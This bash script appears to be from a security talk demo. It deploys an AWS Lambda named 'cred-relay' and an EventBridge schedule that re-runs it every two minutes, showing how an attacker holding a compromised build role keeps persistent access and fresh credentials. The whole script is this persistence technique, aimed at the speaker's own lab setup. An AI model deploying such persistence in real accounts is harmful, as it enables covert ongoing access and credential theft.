#!/usr/bin/env bash
# Speaker Part B, step 1: deploy the persistence Lambda and EventBridge schedule
# live from the projector session.
#
# Prereqs:
#   - terraform/speaker-demo applied
#   - Speaker AWS credentials active (admin or equivalent)
#   - LAMBDA_EXEC_ROLE_ARN from terraform output
#   - AWS_REGION set
#
# Demonstration narrative:
#   "This Lambda was never deployed by this org. I created it right now using
#    the same AWS session an attacker would have after compromising the build
#    role. It will fire every 2 minutes from now on, and every invocation gives
#    an attacker fresh credentials and visibility into the account. No traffic
#    leaves AWS. No endpoint is implanted. No process runs on a host."
set -euo pipefail

: "${LAMBDA_EXEC_ROLE_ARN:?set LAMBDA_EXEC_ROLE_ARN from terraform output}"
: "${AWS_REGION:?set AWS_REGION}"

NAME_PREFIX="${NAME_PREFIX:-rtv-speaker-demo}"
FUNCTION_NAME="${NAME_PREFIX}-cred-relay"
RULE_NAME="${NAME_PREFIX}-cred-relay-trigger"
SCHEDULE="${SCHEDULE:-rate(2 minutes)}"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SRC_DIR="${SCRIPT_DIR}/lambda-src"
BUILD_DIR="$(mktemp -d)"
trap 'rm -rf "$BUILD_DIR"' EXIT

echo "[1/5] Packaging Lambda..."
cp "${SRC_DIR}/index.py" "${BUILD_DIR}/"
cd "$BUILD_DIR"
zip -q lambda.zip index.py
ZIP_PATH="${BUILD_DIR}/lambda.zip"
cd - >/dev/null

echo "[2/5] Creating Lambda function ${FUNCTION_NAME}..."
# If the function exists from a previous run, update it instead
if aws lambda get-function --function-name "$FUNCTION_NAME" --region "$AWS_REGION" >/dev/null 2>&1; then
  echo "      function exists, updating code"
  aws lambda update-function-code \
    --function-name "$FUNCTION_NAME" \
    --zip-file "fileb://${ZIP_PATH}" \
    --region "$AWS_REGION" >/dev/null
else
  aws lambda create-function \
    --function-name "$FUNCTION_NAME" \
    --runtime "python3.12" \
    --role "$LAMBDA_EXEC_ROLE_ARN" \
    --handler "index.lambda_handler" \
    --zip-file "fileb://${ZIP_PATH}" \
    --timeout 30 \
    --region "$AWS_REGION" >/dev/null
fi

LAMBDA_ARN=$(aws lambda get-function \
  --function-name "$FUNCTION_NAME" \
  --query 'Configuration.FunctionArn' --output text \
  --region "$AWS_REGION")
echo "      Lambda ARN: $LAMBDA_ARN"

echo "[3/5] Creating EventBridge schedule ${RULE_NAME} (${SCHEDULE})..."
aws events put-rule \
  --name "$RULE_NAME" \
  --schedule-expression "$SCHEDULE" \
  --state ENABLED \
  --region "$AWS_REGION" >/dev/null

RULE_ARN=$(aws events describe-rule \
  --name "$RULE_NAME" \
  --query Arn --output text \
  --region "$AWS_REGION")

echo "[4/5] Wiring the rule to the Lambda..."
aws events put-targets \
  --rule "$RULE_NAME" \
  --targets "Id=1,Arn=${LAMBDA_ARN}" \
  --region "$AWS_REGION" >/dev/null

# EventBridge needs permission to invoke the Lambda
aws lambda add-permission \
  --function-name "$FUNCTION_NAME" \
  --statement-id "${RULE_NAME}-invoke" \
  --action "lambda:InvokeFunction" \
  --principal "events.amazonaws.com" \
  --source-arn "$RULE_ARN" \
  --region "$AWS_REGION" 2>/dev/null || echo "      (permission already set)"

echo "[5/5] Firing Lambda once immediately to prove it works..."
aws lambda invoke \
  --function-name "$FUNCTION_NAME" \
  --region "$AWS_REGION" \
  /dev/null >/dev/null
sleep 2

LOG_GROUP="/aws/lambda/${FUNCTION_NAME}"
echo ""
echo "Persistence is live. Follow the logs with:"
echo "  aws logs tail ${LOG_GROUP} --since 5m --follow --region ${AWS_REGION}"
echo ""
echo "Rule schedule: ${SCHEDULE}. The Lambda will re-fire automatically."
echo "Run 02-abuse-iam-chain.sh next."
